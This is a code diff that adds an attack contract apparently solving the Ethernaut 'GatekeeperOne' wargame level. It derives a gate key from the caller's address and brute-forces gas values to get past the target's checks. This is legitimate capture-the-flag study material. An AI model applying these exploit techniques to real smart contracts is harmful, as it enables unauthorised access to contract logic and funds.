@@ -26,3 +26,28 @@ contract GatekeeperOne {
         return true;
     }
 }
+
+
+contract GatekeeperOneAttack {
+    function attack(address gatekeeper) public {
+        // Step 1: Derive key based on tx.origin (your address)
+        uint16 originLow = uint16(uint160(tx.origin)); // last 2 bytes of origin
+        uint64 key = uint64(originLow);                // lower 16 bits
+
+        // Ensure uint32(key) != key
+        // So pad the upper bits with non-zero
+        key |= uint64(1) << 63; // make it a 64-bit number that fails full match
+
+        bytes8 gateKey = bytes8(key);
+
+        // Step 2: Brute-force gas
+        for (uint256 i = 0; i < 8191; i++) {
+            (bool success, ) = gatekeeper.call{gas: i + 8191 * 3}(
+                abi.encodeWithSignature("enter(bytes8)", gateKey)
+            );
+            if (success) {
+                break;
+            }
+        }
+    }
+}
